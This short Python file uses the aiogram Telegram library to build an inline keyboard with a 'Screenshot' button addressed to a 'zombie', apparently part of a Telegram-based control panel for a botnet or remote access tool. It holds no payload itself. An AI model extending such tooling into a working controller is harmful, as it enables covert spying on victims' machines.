from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup

async def control_main(zombie):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='📷 Screenshot', callback_data=f'control_screenshot_{zombie}')]
    ])